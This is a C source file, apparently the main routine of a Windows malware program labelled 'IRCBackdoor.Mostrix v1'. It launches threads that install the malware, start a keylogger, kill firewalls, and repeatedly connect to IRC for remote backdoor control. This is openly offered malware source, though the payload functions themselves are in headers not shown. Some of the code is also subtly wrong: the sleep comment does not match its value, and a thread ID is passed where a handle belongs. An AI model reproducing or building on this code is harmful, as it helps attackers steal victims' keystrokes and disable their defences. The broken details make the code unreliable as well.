#include <small.h>
#include <windows.h>

#include "Install.h"
#include "KillFW.h"
#include "Keylogger.h"
#include "IrcClient.h"

int main()
{
	DWORD	InstallThreadId;
	DWORD	KeyloggerThreadId;
	DWORD	KillFWThreadId;
	DWORD	IrcClientThreadId;
	DWORD	ExitCode;

	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Install, 0, 0, &InstallThreadId);	//install mostrix
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Keylogger, 0, 0, &KeyloggerThreadId);//start keylogger
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)KillFW, 0, 0, &KillFWThreadId);      //kill some firewalls

	while(lstrcmp("IRCBackdoor.Mostrix v1", "by DiA/rrlf") != 0) // ;)
	{
		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)IrcClient, 0, 0, &IrcClientThreadId);//connect to irc
		Sleep(180000); //sleep 30 minutes, then reconnect
		GetExitCodeThread(&IrcClientThreadId, &ExitCode);
		ExitThread(ExitCode);
	}

	return 0;
}